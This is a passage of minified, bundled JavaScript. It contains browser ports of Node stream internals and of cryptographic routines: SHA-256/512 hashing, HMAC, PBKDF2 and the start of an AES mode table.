                o || (s = d(a, t)), s ? e.emit("error", s) : a.objectMode || t && t.length > 0 ? ("string" == typeof t || a.objectMode || Object.getPrototypeOf(t) === B.prototype || (t = r(t)), i ? a.endEmitted ? e.emit("error", new Error("stream.unshift() after end event")) : l(e, a, t, !0) : a.ended ? e.emit("error", new Error("stream.push() after EOF")) : (a.reading = !1, a.decoder && !n ? (t = a.decoder.write(t), a.objectMode || 0 !== t.length ? l(e, a, t, !1) : v(e, a)) : l(e, a, t, !1))) : i || (a.reading = !1) } return f(a) }

        function l(e, t, n, i) { t.flowing && 0 === t.length && !t.sync ? (e.emit("data", n), e.read(0)) : (t.length += t.objectMode ? 1 : n.length, i ? t.buffer.unshift(n) : t.buffer.push(n), t.needReadable && m(e)), v(e, t) }

        function d(e, t) { var n; return o(t) || "string" == typeof t || void 0 === t || e.objectMode || (n = new TypeError("Invalid non-string/buffer chunk")), n }

        function f(e) { return !e.ended && (e.needReadable || e.length < e.highWaterMark || 0 === e.length) }

        function h(e) { return e >= K ? e = K : (e--, e |= e >>> 1, e |= e >>> 2, e |= e >>> 4, e |= e >>> 8, e |= e >>> 16, e++), e }

        function p(e, t) { return e <= 0 || 0 === t.length && t.ended ? 0 : t.objectMode ? 1 : e !== e ? t.flowing && t.length ? t.buffer.head.data.length : t.length : (e > t.highWaterMark && (t.highWaterMark = h(e)), e <= t.length ? e : t.ended ? t.length : (t.needReadable = !0, 0)) }

        function b(e, t) { if (!t.ended) { if (t.decoder) { var n = t.decoder.end();
                    n && n.length && (t.buffer.push(n), t.length += t.objectMode ? 1 : n.length) } t.ended = !0, m(e) } }

        function m(e) { var t = e._readableState;
            t.needReadable = !1, t.emittedReadable || (z("emitReadable", t.flowing), t.emittedReadable = !0, t.sync ? I(g, e) : g(e)) }

        function g(e) { z("emit readable"), e.emit("readable"), k(e) }

        function v(e, t) { t.readingMore || (t.readingMore = !0, I(y, e, t)) }

        function y(e, t) { for (var n = t.length; !t.reading && !t.flowing && !t.ended && t.length < t.highWaterMark && (z("maybeReadMore read 0"), e.read(0), n !== t.length);) n = t.length;
            t.readingMore = !1 }

        function w(e) { return function() { var t = e._readableState;
                z("pipeOnDrain", t.awaitDrain), t.awaitDrain && t.awaitDrain--, 0 === t.awaitDrain && j(e, "data") && (t.flowing = !0, k(e)) } }

        function x(e) { z("readable nexttick read 0"), e.read(0) }

        function S(e, t) { t.resumeScheduled || (t.resumeScheduled = !0, I(_, e, t)) }

        function _(e, t) { t.reading || (z("resume read 0"), e.read(0)), t.resumeScheduled = !1, t.awaitDrain = 0, e.emit("resume"), k(e), t.flowing && !t.reading && e.read(0) }

        function k(e) { var t = e._readableState; for (z("flow", t.flowing); t.flowing && null !== e.read();); }

        function C(e, t) { if (0 === t.length) return null; var n; return t.objectMode ? n = t.buffer.shift() : !e || e >= t.length ? (n = t.decoder ? t.buffer.join("") : 1 === t.buffer.length ? t.buffer.head.data : t.buffer.concat(t.length), t.buffer.clear()) : n = A(e, t.buffer, t.decoder), n }

        function A(e, t, n) { var i; return e < t.head.data.length ? (i = t.head.data.slice(0, e), t.head.data = t.head.data.slice(e)) : i = e === t.head.data.length ? t.shift() : n ? E(e, t) : T(e, t), i }

        function E(e, t) { var n = t.head,
                i = 1,
                r = n.data; for (e -= r.length; n = n.next;) { var o = n.data,
                    a = e > o.length ? o.length : e; if (a === o.length ? r += o : r += o.slice(0, e), 0 === (e -= a)) { a === o.length ? (++i, n.next ? t.head = n.next : t.head = t.tail = null) : (t.head = n, n.data = o.slice(a)); break }++i } return t.length -= i, r }

        function T(e, t) { var n = B.allocUnsafe(e),
                i = t.head,
                r = 1; for (i.data.copy(n), e -= i.data.length; i = i.next;) { var o = i.data,
                    a = e > o.length ? o.length : e; if (o.copy(n, n.length - e, 0, a), 0 === (e -= a)) { a === o.length ? (++r, i.next ? t.head = i.next : t.head = t.tail = null) : (t.head = i, i.data = o.slice(a)); break }++r } return t.length -= r, n }

        function M(e) { var t = e._readableState; if (t.length > 0) throw new Error('"endReadable()" called on non-empty stream');
            t.endEmitted || (t.ended = !0, I(R, t, e)) }

        function R(e, t) { e.endEmitted || 0 !== e.length || (e.endEmitted = !0, t.readable = !1, t.emit("end")) }

        function P(e, t) { for (var n = 0, i = e.length; n < i; n++)
                if (e[n] === t) return n; return -1 } var I = n(20);
        e.exports = c; var D, O = n(37);
        c.ReadableState = s; var j = (n(27).EventEmitter, function(e, t) { return e.listeners(t).length }),
            q = n(39),
            B = n(1).Buffer,
            L = t.Uint8Array || function() {},
            N = n(14);
        N.inherits = n(0); var F = n(77),
            z = void 0;
        z = F && F.debuglog ? F.debuglog("stream") : function() {}; var U, H = n(78),
            V = n(40);
        N.inherits(c, q); var W = ["error", "close", "destroy", "pause", "resume"];
        Object.defineProperty(c.prototype, "destroyed", { get: function() { return void 0 !== this._readableState && this._readableState.destroyed }, set: function(e) { this._readableState && (this._readableState.destroyed = e) } }), c.prototype.destroy = V.destroy, c.prototype._undestroy = V.undestroy, c.prototype._destroy = function(e, t) { this.push(null), t(e) }, c.prototype.push = function(e, t) { var n, i = this._readableState; return i.objectMode ? n = !0 : "string" == typeof e && (t = t || i.defaultEncoding, t !== i.encoding && (e = B.from(e, t), t = ""), n = !0), u(this, e, t, !1, n) }, c.prototype.unshift = function(e) { return u(this, e, null, !0, !1) }, c.prototype.isPaused = function() { return !1 === this._readableState.flowing }, c.prototype.setEncoding = function(e) { return U || (U = n(30).StringDecoder), this._readableState.decoder = new U(e), this._readableState.encoding = e, this }; var K = 8388608;
        c.prototype.read = function(e) { z("read", e), e = parseInt(e, 10); var t = this._readableState,
                n = e; if (0 !== e && (t.emittedReadable = !1), 0 === e && t.needReadable && (t.length >= t.highWaterMark || t.ended)) return z("read: emitReadable", t.length, t.ended), 0 === t.length && t.ended ? M(this) : m(this), null; if (0 === (e = p(e, t)) && t.ended) return 0 === t.length && M(this), null; var i = t.needReadable;
            z("need readable", i), (0 === t.length || t.length - e < t.highWaterMark) && (i = !0, z("length less than watermark", i)), t.ended || t.reading ? (i = !1, z("reading or ended", i)) : i && (z("do read"), t.reading = !0, t.sync = !0, 0 === t.length && (t.needReadable = !0), this._read(t.highWaterMark), t.sync = !1, t.reading || (e = p(n, t))); var r; return r = e > 0 ? C(e, t) : null, null === r ? (t.needReadable = !0, e = 0) : t.length -= e, 0 === t.length && (t.ended || (t.needReadable = !0), n !== e && t.ended && M(this)), null !== r && this.emit("data", r), r }, c.prototype._read = function(e) { this.emit("error", new Error("_read() is not implemented")) }, c.prototype.pipe = function(e, t) {
            function n(e, t) { z("onunpipe"), e === f && t && !1 === t.hasUnpiped && (t.hasUnpiped = !0, o()) }

            function r() { z("onend"), e.end() }

            function o() { z("cleanup"), e.removeListener("close", u), e.removeListener("finish", l), e.removeListener("drain", m), e.removeListener("error", c), e.removeListener("unpipe", n), f.removeListener("end", r), f.removeListener("end", d), f.removeListener("data", s), g = !0, !h.awaitDrain || e._writableState && !e._writableState.needDrain || m() }

            function s(t) { z("ondata"), v = !1, !1 !== e.write(t) || v || ((1 === h.pipesCount && h.pipes === e || h.pipesCount > 1 && -1 !== P(h.pipes, e)) && !g && (z("false write response, pause", f._readableState.awaitDrain), f._readableState.awaitDrain++, v = !0), f.pause()) }

            function c(t) { z("onerror", t), d(), e.removeListener("error", c), 0 === j(e, "error") && e.emit("error", t) }

            function u() { e.removeListener("finish", l), d() }

            function l() { z("onfinish"), e.removeListener("close", u), d() }

            function d() { z("unpipe"), f.unpipe(e) } var f = this,
                h = this._readableState; switch (h.pipesCount) {
                case 0:
                    h.pipes = e; break;
                case 1:
                    h.pipes = [h.pipes, e]; break;
                default:
                    h.pipes.push(e) } h.pipesCount += 1, z("pipe count=%d opts=%j", h.pipesCount, t); var p = (!t || !1 !== t.end) && e !== i.stdout && e !== i.stderr,
                b = p ? r : d;
            h.endEmitted ? I(b) : f.once("end", b), e.on("unpipe", n); var m = w(f);
            e.on("drain", m); var g = !1,
                v = !1; return f.on("data", s), a(e, "error", c), e.once("close", u), e.once("finish", l), e.emit("pipe", f), h.flowing || (z("pipe resume"), f.resume()), e }, c.prototype.unpipe = function(e) { var t = this._readableState,
                n = { hasUnpiped: !1 }; if (0 === t.pipesCount) return this; if (1 === t.pipesCount) return e && e !== t.pipes ? this : (e || (e = t.pipes), t.pipes = null, t.pipesCount = 0, t.flowing = !1, e && e.emit("unpipe", this, n), this); if (!e) { var i = t.pipes,
                    r = t.pipesCount;
                t.pipes = null, t.pipesCount = 0, t.flowing = !1; for (var o = 0; o < r; o++) i[o].emit("unpipe", this, n); return this } var a = P(t.pipes, e); return -1 === a ? this : (t.pipes.splice(a, 1), t.pipesCount -= 1, 1 === t.pipesCount && (t.pipes = t.pipes[0]), e.emit("unpipe", this, n), this) }, c.prototype.on = function(e, t) { var n = q.prototype.on.call(this, e, t); if ("data" === e) !1 !== this._readableState.flowing && this.resume();
            else if ("readable" === e) { var i = this._readableState;
                i.endEmitted || i.readableListening || (i.readableListening = i.needReadable = !0, i.emittedReadable = !1, i.reading ? i.length && m(this) : I(x, this)) } return n }, c.prototype.addListener = c.prototype.on, c.prototype.resume = function() { var e = this._readableState; return e.flowing || (z("resume"), e.flowing = !0, S(this, e)), this }, c.prototype.pause = function() { return z("call pause flowing=%j", this._readableState.flowing), !1 !== this._readableState.flowing && (z("pause"), this._readableState.flowing = !1, this.emit("pause")), this }, c.prototype.wrap = function(e) { var t = this._readableState,
                n = !1,
                i = this;
            e.on("end", function() { if (z("wrapped end"), t.decoder && !t.ended) { var e = t.decoder.end();
                    e && e.length && i.push(e) } i.push(null) }), e.on("data", function(r) { if (z("wrapped data"), t.decoder && (r = t.decoder.write(r)), (!t.objectMode || null !== r && void 0 !== r) && (t.objectMode || r && r.length)) { i.push(r) || (n = !0, e.pause()) } }); for (var r in e) void 0 === this[r] && "function" == typeof e[r] && (this[r] = function(t) { return function() { return e[t].apply(e, arguments) } }(r)); for (var o = 0; o < W.length; o++) e.on(W[o], i.emit.bind(i, W[o])); return i._read = function(t) { z("wrapped _read", t), n && (n = !1, e.resume()) }, i }, c._fromList = C }).call(t, n(7), n(8)) }, function(e, t, n) { e.exports = n(27).EventEmitter }, function(e, t, n) { "use strict";

    function i(e, t) { var n = this,
            i = this._readableState && this._readableState.destroyed,
            r = this._writableState && this._writableState.destroyed; if (i || r) return void(t ? t(e) : !e || this._writableState && this._writableState.errorEmitted || a(o, this, e));
        this._readableState && (this._readableState.destroyed = !0), this._writableState && (this._writableState.destroyed = !0), this._destroy(e || null, function(e) {!t && e ? (a(o, n, e), n._writableState && (n._writableState.errorEmitted = !0)) : t && t(e) }) }

    function r() { this._readableState && (this._readableState.destroyed = !1, this._readableState.reading = !1, this._readableState.ended = !1, this._readableState.endEmitted = !1), this._writableState && (this._writableState.destroyed = !1, this._writableState.ended = !1, this._writableState.ending = !1, this._writableState.finished = !1, this._writableState.errorEmitted = !1) }

    function o(e, t) { e.emit("error", t) } var a = n(20);
    e.exports = { destroy: i, undestroy: r } }, function(e, t, n) { "use strict";

    function i(e) { this.afterTransform = function(t, n) { return r(e, t, n) }, this.needTransform = !1, this.transforming = !1, this.writecb = null, this.writechunk = null, this.writeencoding = null }

    function r(e, t, n) { var i = e._transformState;
        i.transforming = !1; var r = i.writecb; if (!r) return e.emit("error", new Error("write callback called multiple times"));
        i.writechunk = null, i.writecb = null, null !== n && void 0 !== n && e.push(n), r(t); var o = e._readableState;
        o.reading = !1, (o.needReadable || o.length < o.highWaterMark) && e._read(o.highWaterMark) }

    function o(e) { if (!(this instanceof o)) return new o(e);
        s.call(this, e), this._transformState = new i(this); var t = this;
        this._readableState.needReadable = !0, this._readableState.sync = !1, e && ("function" == typeof e.transform && (this._transform = e.transform), "function" == typeof e.flush && (this._flush = e.flush)), this.once("prefinish", function() { "function" == typeof this._flush ? this._flush(function(e, n) { a(t, e, n) }) : a(t) }) }

    function a(e, t, n) { if (t) return e.emit("error", t);
        null !== n && void 0 !== n && e.push(n); var i = e._writableState,
            r = e._transformState; if (i.length) throw new Error("Calling transform done when ws.length != 0"); if (r.transforming) throw new Error("Calling transform done when still transforming"); return e.push(null) } e.exports = o; var s = n(10),
        c = n(14);
    c.inherits = n(0), c.inherits(o, s), o.prototype.push = function(e, t) { return this._transformState.needTransform = !1, s.prototype.push.call(this, e, t) }, o.prototype._transform = function(e, t, n) { throw new Error("_transform() is not implemented") }, o.prototype._write = function(e, t, n) { var i = this._transformState; if (i.writecb = n, i.writechunk = e, i.writeencoding = t, !i.transforming) { var r = this._readableState;
            (i.needTransform || r.needReadable || r.length < r.highWaterMark) && this._read(r.highWaterMark) } }, o.prototype._read = function(e) { var t = this._transformState;
        null !== t.writechunk && t.writecb && !t.transforming ? (t.transforming = !0, this._transform(t.writechunk, t.writeencoding, t.afterTransform)) : t.needTransform = !0 }, o.prototype._destroy = function(e, t) { var n = this;
        s.prototype._destroy.call(this, e, function(e) { t(e), n.emit("close") }) } }, function(e, t, n) {
    function i() { this.init(), this._w = p, d.call(this, 64, 56) }

    function r(e, t, n) { return n ^ e & (t ^ n) }

    function o(e, t, n) { return e & t | n & (e | t) }

    function a(e) { return (e >>> 2 | e << 30) ^ (e >>> 13 | e << 19) ^ (e >>> 22 | e << 10) }

    function s(e) { return (e >>> 6 | e << 26) ^ (e >>> 11 | e << 21) ^ (e >>> 25 | e << 7) }

    function c(e) { return (e >>> 7 | e << 25) ^ (e >>> 18 | e << 14) ^ e >>> 3 }

    function u(e) { return (e >>> 17 | e << 15) ^ (e >>> 19 | e << 13) ^ e >>> 10 } var l = n(0),
        d = n(12),
        f = n(1).Buffer,
        h = [1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298],
        p = new Array(64);
    l(i, d), i.prototype.init = function() { return this._a = 1779033703, this._b = 3144134277, this._c = 1013904242, this._d = 2773480762, this._e = 1359893119, this._f = 2600822924, this._g = 528734635, this._h = 1541459225, this }, i.prototype._update = function(e) { for (var t = this._w, n = 0 | this._a, i = 0 | this._b, l = 0 | this._c, d = 0 | this._d, f = 0 | this._e, p = 0 | this._f, b = 0 | this._g, m = 0 | this._h, g = 0; g < 16; ++g) t[g] = e.readInt32BE(4 * g); for (; g < 64; ++g) t[g] = u(t[g - 2]) + t[g - 7] + c(t[g - 15]) + t[g - 16] | 0; for (var v = 0; v < 64; ++v) { var y = m + s(f) + r(f, p, b) + h[v] + t[v] | 0,
                w = a(n) + o(n, i, l) | 0;
            m = b, b = p, p = f, f = d + y | 0, d = l, l = i, i = n, n = y + w | 0 } this._a = n + this._a | 0, this._b = i + this._b | 0, this._c = l + this._c | 0, this._d = d + this._d | 0, this._e = f + this._e | 0, this._f = p + this._f | 0, this._g = b + this._g | 0, this._h = m + this._h | 0 }, i.prototype._hash = function() { var e = f.allocUnsafe(32); return e.writeInt32BE(this._a, 0), e.writeInt32BE(this._b, 4), e.writeInt32BE(this._c, 8), e.writeInt32BE(this._d, 12), e.writeInt32BE(this._e, 16), e.writeInt32BE(this._f, 20), e.writeInt32BE(this._g, 24), e.writeInt32BE(this._h, 28), e }, e.exports = i }, function(e, t, n) {
    function i() { this.init(), this._w = g, p.call(this, 128, 112) }

    function r(e, t, n) { return n ^ e & (t ^ n) }

    function o(e, t, n) { return e & t | n & (e | t) }

    function a(e, t) { return (e >>> 28 | t << 4) ^ (t >>> 2 | e << 30) ^ (t >>> 7 | e << 25) }

    function s(e, t) { return (e >>> 14 | t << 18) ^ (e >>> 18 | t << 14) ^ (t >>> 9 | e << 23) }

    function c(e, t) { return (e >>> 1 | t << 31) ^ (e >>> 8 | t << 24) ^ e >>> 7 }

    function u(e, t) { return (e >>> 1 | t << 31) ^ (e >>> 8 | t << 24) ^ (e >>> 7 | t << 25) }

    function l(e, t) { return (e >>> 19 | t << 13) ^ (t >>> 29 | e << 3) ^ e >>> 6 }

    function d(e, t) { return (e >>> 19 | t << 13) ^ (t >>> 29 | e << 3) ^ (e >>> 6 | t << 26) }

    function f(e, t) { return e >>> 0 < t >>> 0 ? 1 : 0 } var h = n(0),
        p = n(12),
        b = n(1).Buffer,
        m = [1116352408, 3609767458, 1899447441, 602891725, 3049323471, 3964484399, 3921009573, 2173295548, 961987163, 4081628472, 1508970993, 3053834265, 2453635748, 2937671579, 2870763221, 3664609560, 3624381080, 2734883394, 310598401, 1164996542, 607225278, 1323610764, 1426881987, 3590304994, 1925078388, 4068182383, 2162078206, 991336113, 2614888103, 633803317, 3248222580, 3479774868, 3835390401, 2666613458, 4022224774, 944711139, 264347078, 2341262773, 604807628, 2007800933, 770255983, 1495990901, 1249150122, 1856431235, 1555081692, 3175218132, 1996064986, 2198950837, 2554220882, 3999719339, 2821834349, 766784016, 2952996808, 2566594879, 3210313671, 3203337956, 3336571891, 1034457026, 3584528711, 2466948901, 113926993, 3758326383, 338241895, 168717936, 666307205, 1188179964, 773529912, 1546045734, 1294757372, 1522805485, 1396182291, 2643833823, 1695183700, 2343527390, 1986661051, 1014477480, 2177026350, 1206759142, 2456956037, 344077627, 2730485921, 1290863460, 2820302411, 3158454273, 3259730800, 3505952657, 3345764771, 106217008, 3516065817, 3606008344, 3600352804, 1432725776, 4094571909, 1467031594, 275423344, 851169720, 430227734, 3100823752, 506948616, 1363258195, 659060556, 3750685593, 883997877, 3785050280, 958139571, 3318307427, 1322822218, 3812723403, 1537002063, 2003034995, 1747873779, 3602036899, 1955562222, 1575990012, 2024104815, 1125592928, 2227730452, 2716904306, 2361852424, 442776044, 2428436474, 593698344, 2756734187, 3733110249, 3204031479, 2999351573, 3329325298, 3815920427, 3391569614, 3928383900, 3515267271, 566280711, 3940187606, 3454069534, 4118630271, 4000239992, 116418474, 1914138554, 174292421, 2731055270, 289380356, 3203993006, 460393269, 320620315, 685471733, 587496836, 852142971, 1086792851, 1017036298, 365543100, 1126000580, 2618297676, 1288033470, 3409855158, 1501505948, 4234509866, 1607167915, 987167468, 1816402316, 1246189591],
        g = new Array(160);
    h(i, p), i.prototype.init = function() { return this._ah = 1779033703, this._bh = 3144134277, this._ch = 1013904242, this._dh = 2773480762, this._eh = 1359893119, this._fh = 2600822924, this._gh = 528734635, this._hh = 1541459225, this._al = 4089235720, this._bl = 2227873595, this._cl = 4271175723, this._dl = 1595750129, this._el = 2917565137, this._fl = 725511199, this._gl = 4215389547, this._hl = 327033209, this }, i.prototype._update = function(e) { for (var t = this._w, n = 0 | this._ah, i = 0 | this._bh, h = 0 | this._ch, p = 0 | this._dh, b = 0 | this._eh, g = 0 | this._fh, v = 0 | this._gh, y = 0 | this._hh, w = 0 | this._al, x = 0 | this._bl, S = 0 | this._cl, _ = 0 | this._dl, k = 0 | this._el, C = 0 | this._fl, A = 0 | this._gl, E = 0 | this._hl, T = 0; T < 32; T += 2) t[T] = e.readInt32BE(4 * T), t[T + 1] = e.readInt32BE(4 * T + 4); for (; T < 160; T += 2) { var M = t[T - 30],
                R = t[T - 30 + 1],
                P = c(M, R),
                I = u(R, M);
            M = t[T - 4], R = t[T - 4 + 1]; var D = l(M, R),
                O = d(R, M),
                j = t[T - 14],
                q = t[T - 14 + 1],
                B = t[T - 32],
                L = t[T - 32 + 1],
                N = I + q | 0,
                F = P + j + f(N, I) | 0;
            N = N + O | 0, F = F + D + f(N, O) | 0, N = N + L | 0, F = F + B + f(N, L) | 0, t[T] = F, t[T + 1] = N } for (var z = 0; z < 160; z += 2) { F = t[z], N = t[z + 1]; var U = o(n, i, h),
                H = o(w, x, S),
                V = a(n, w),
                W = a(w, n),
                K = s(b, k),
                Y = s(k, b),
                X = m[z],
                $ = m[z + 1],
                G = r(b, g, v),
                J = r(k, C, A),
                Z = E + Y | 0,
                Q = y + K + f(Z, E) | 0;
            Z = Z + J | 0, Q = Q + G + f(Z, J) | 0, Z = Z + $ | 0, Q = Q + X + f(Z, $) | 0, Z = Z + N | 0, Q = Q + F + f(Z, N) | 0; var ee = W + H | 0,
                te = V + U + f(ee, W) | 0;
            y = v, E = A, v = g, A = C, g = b, C = k, k = _ + Z | 0, b = p + Q + f(k, _) | 0, p = h, _ = S, h = i, S = x, i = n, x = w, w = Z + ee | 0, n = Q + te + f(w, Z) | 0 } this._al = this._al + w | 0, this._bl = this._bl + x | 0, this._cl = this._cl + S | 0, this._dl = this._dl + _ | 0, this._el = this._el + k | 0, this._fl = this._fl + C | 0, this._gl = this._gl + A | 0, this._hl = this._hl + E | 0, this._ah = this._ah + n + f(this._al, w) | 0, this._bh = this._bh + i + f(this._bl, x) | 0, this._ch = this._ch + h + f(this._cl, S) | 0, this._dh = this._dh + p + f(this._dl, _) | 0, this._eh = this._eh + b + f(this._el, k) | 0, this._fh = this._fh + g + f(this._fl, C) | 0, this._gh = this._gh + v + f(this._gl, A) | 0, this._hh = this._hh + y + f(this._hl, E) | 0 }, i.prototype._hash = function() {
        function e(e, n, i) { t.writeInt32BE(e, i), t.writeInt32BE(n, i + 4) } var t = b.allocUnsafe(64); return e(this._ah, this._al, 0), e(this._bh, this._bl, 8), e(this._ch, this._cl, 16), e(this._dh, this._dl, 24), e(this._eh, this._el, 32), e(this._fh, this._fl, 40), e(this._gh, this._gl, 48), e(this._hh, this._hl, 56), t }, e.exports = i }, function(e, t, n) { "use strict";

    function i(e, t) { a.call(this, "digest"), "string" == typeof t && (t = s.from(t)); var n = "sha512" === e || "sha384" === e ? 128 : 64; if (this._alg = e, this._key = t, t.length > n) { t = ("rmd160" === e ? new u : l(e)).update(t).digest() } else t.length < n && (t = s.concat([t, d], n)); for (var i = this._ipad = s.allocUnsafe(n), r = this._opad = s.allocUnsafe(n), o = 0; o < n; o++) i[o] = 54 ^ t[o], r[o] = 92 ^ t[o];
        this._hash = "rmd160" === e ? new u : l(e), this._hash.update(i) } var r = n(0),
        o = n(91),
        a = n(9),
        s = n(1).Buffer,
        c = n(25),
        u = n(26),
        l = n(31),
        d = s.alloc(128);
    r(i, a), i.prototype._update = function(e) { this._hash.update(e) }, i.prototype._final = function() { var e = this._hash.digest(); return ("rmd160" === this._alg ? new u : l(this._alg)).update(this._opad).update(e).digest() }, e.exports = function(e, t) { return e = e.toLowerCase(), "rmd160" === e || "ripemd160" === e ? new i("rmd160", t) : "md5" === e ? new o(c, t) : new i(e, t) } }, function(e, t) { e.exports = { sha224WithRSAEncryption: { sign: "rsa", hash: "sha224", id: "302d300d06096086480165030402040500041c" }, "RSA-SHA224": { sign: "ecdsa/rsa", hash: "sha224", id: "302d300d06096086480165030402040500041c" }, sha256WithRSAEncryption: { sign: "rsa", hash: "sha256", id: "3031300d060960864801650304020105000420" }, "RSA-SHA256": { sign: "ecdsa/rsa", hash: "sha256", id: "3031300d060960864801650304020105000420" }, sha384WithRSAEncryption: { sign: "rsa", hash: "sha384", id: "3041300d060960864801650304020205000430" }, "RSA-SHA384": { sign: "ecdsa/rsa", hash: "sha384", id: "3041300d060960864801650304020205000430" }, sha512WithRSAEncryption: { sign: "rsa", hash: "sha512", id: "3051300d060960864801650304020305000440" }, "RSA-SHA512": { sign: "ecdsa/rsa", hash: "sha512", id: "3051300d060960864801650304020305000440" }, "RSA-SHA1": { sign: "rsa", hash: "sha1", id: "3021300906052b0e03021a05000414" }, "ecdsa-with-SHA1": { sign: "ecdsa", hash: "sha1", id: "" }, sha256: { sign: "ecdsa", hash: "sha256", id: "" }, sha224: { sign: "ecdsa", hash: "sha224", id: "" }, sha384: { sign: "ecdsa", hash: "sha384", id: "" }, sha512: { sign: "ecdsa", hash: "sha512", id: "" }, "DSA-SHA": { sign: "dsa", hash: "sha1", id: "" }, "DSA-SHA1": { sign: "dsa", hash: "sha1", id: "" }, DSA: { sign: "dsa", hash: "sha1", id: "" }, "DSA-WITH-SHA224": { sign: "dsa", hash: "sha224", id: "" }, "DSA-SHA224": { sign: "dsa", hash: "sha224", id: "" }, "DSA-WITH-SHA256": { sign: "dsa", hash: "sha256", id: "" }, "DSA-SHA256": { sign: "dsa", hash: "sha256", id: "" }, "DSA-WITH-SHA384": { sign: "dsa", hash: "sha384", id: "" }, "DSA-SHA384": { sign: "dsa", hash: "sha384", id: "" }, "DSA-WITH-SHA512": { sign: "dsa", hash: "sha512", id: "" }, "DSA-SHA512": { sign: "dsa", hash: "sha512", id: "" }, "DSA-RIPEMD160": { sign: "dsa", hash: "rmd160", id: "" }, ripemd160WithRSA: { sign: "rsa", hash: "rmd160", id: "3021300906052b2403020105000414" }, "RSA-RIPEMD160": { sign: "rsa", hash: "rmd160", id: "3021300906052b2403020105000414" }, md5WithRSAEncryption: { sign: "rsa", hash: "md5", id: "3020300c06082a864886f70d020505000410" }, "RSA-MD5": { sign: "rsa", hash: "md5", id: "3020300c06082a864886f70d020505000410" } } }, function(e, t, n) { t.pbkdf2 = n(93), t.pbkdf2Sync = n(49) }, function(e, t) { var n = Math.pow(2, 30) - 1;
    e.exports = function(e, t) { if ("number" != typeof e) throw new TypeError("Iterations not a number"); if (e < 0) throw new TypeError("Bad iterations"); if ("number" != typeof t) throw new TypeError("Key length not a number"); if (t < 0 || t > n || t !== t) throw new TypeError("Bad key length") } }, function(e, t, n) {
    (function(t) { var n; if (t.browser) n = "utf-8";
        else { n = parseInt(t.version.split(".")[0].slice(1), 10) >= 6 ? "utf-8" : "binary" } e.exports = n }).call(t, n(8)) }, function(e, t, n) {
    function i(e, t, n) { var i = r(e),
            o = "sha512" === e || "sha384" === e ? 128 : 64;
        t.length > o ? t = i(t) : t.length < o && (t = d.concat([t, f], o)); for (var a = d.allocUnsafe(o + h[e]), s = d.allocUnsafe(o + h[e]), c = 0; c < o; c++) a[c] = 54 ^ t[c], s[c] = 92 ^ t[c]; var u = d.allocUnsafe(o + n + 4);
        a.copy(u, 0, 0, o), this.ipad1 = u, this.ipad2 = a, this.opad = s, this.alg = e, this.blocksize = o, this.hash = i, this.size = h[e] }

    function r(e) {
        function t(t) { return c(e).update(t).digest() } return "rmd160" === e || "ripemd160" === e ? s : "md5" === e ? a : t }

    function o(e, t, n, r, o) { d.isBuffer(e) || (e = d.from(e, l)), d.isBuffer(t) || (t = d.from(t, l)), u(n, r), o = o || "sha1"; var a = new i(o, e, t.length),
            s = d.allocUnsafe(r),
            c = d.allocUnsafe(t.length + 4);
        t.copy(c, 0, 0, t.length); for (var f = 0, p = h[o], b = Math.ceil(r / p), m = 1; m <= b; m++) { c.writeUInt32BE(m, t.length); for (var g = a.run(c, a.ipad1), v = g, y = 1; y < n; y++) { v = a.run(v, a.ipad2); for (var w = 0; w < p; w++) g[w] ^= v[w] } g.copy(s, f), f += p } return s } var a = n(25),
        s = n(26),
        c = n(31),
        u = n(47),
        l = n(48),
        d = n(1).Buffer,
        f = d.alloc(128),
        h = { md5: 16, sha1: 20, sha224: 28, sha256: 32, sha384: 48, sha512: 64, rmd160: 20, ripemd160: 20 };
    i.prototype.run = function(e, t) { return e.copy(t, this.blocksize), this.hash(t).copy(this.opad, this.blocksize), this.hash(this.opad) }, e.exports = o }, function(e, t, n) {
    function i(e) { var t = e._cipher.encryptBlockRaw(e._prev); return a(e._prev), t } var r = n(15),
        o = n(1).Buffer,
        a = n(51);
    t.encrypt = function(e, t) { var n = Math.ceil(t.length / 16),
            a = e._cache.length;
        e._cache = o.concat([e._cache, o.allocUnsafe(16 * n)]); for (var s = 0; s < n; s++) { var c = i(e),
                u = a + 16 * s;
            e._cache.writeUInt32BE(c[0], u + 0), e._cache.writeUInt32BE(c[1], u + 4), e._cache.writeUInt32BE(c[2], u + 8), e._cache.writeUInt32BE(c[3], u + 12) } var l = e._cache.slice(0, t.length); return e._cache = e._cache.slice(t.length), r(t, l) } }, function(e, t) {
    function n(e) { for (var t, n = e.length; n--;) { if (255 !== (t = e.readUInt8(n))) { t++, e.writeUInt8(t, n); break } e.writeUInt8(0, n) } } e.exports = n }, function(e, t) { e.exports = { "aes-128-ecb": { cipher: "AES", key: 128, iv: 0, mode: "ECB", type: "block" }, "aes-192-ecb": { cipher: "AES", key: 192, iv: 0, mode: "ECB", type: "block" }, "aes-256-ecb": { cipher: "AES", key: 256, iv: 0, mode: "ECB", type: "block" }, "aes-128-cbc": { cipher: "AES", key: 128, iv: 16, mode: "CBC", type: "block" }, "aes-192-cbc": { cipher: "AES", key: 192, iv: 16, mode: "CBC", type: "block" }, "aes-256-cbc": { cipher: "AES", key: 256, iv: 16, mode: "CBC", type: "block" }, aes128: { cipher: "AES", key: 128, iv: 16, mode: "CBC", type: "block" }, aes192: { cipher: "AES", key: 192, iv: 16, mode: "CBC", type: "block" }, aes256: { cipher: "AES", key: 256, iv: 16, mode: "CBC", type: "block" }, "aes-128-cfb": { cipher: "AES", key: 128, iv: 16, mode: "CFB", type: "stream" }, "aes-192-cfb": { cipher: "AES", key: 192, iv: 16, mode: "CFB", type: "stream" }, "aes-256-cfb": { cipher: "AES", key: 256, iv: 16, mode: "CFB", type: "stream" }, "aes-128-cfb8": { cipher: "AES", key: 128, iv: 16, mode: "CFB8", type: "stream" }, "aes-192-cfb8": { cipher: "AES", key: 192, iv: 16, mode: "CFB8", type: "stream" }, "aes-256-cfb8": { cipher: "AES", key: 256, iv: 16, 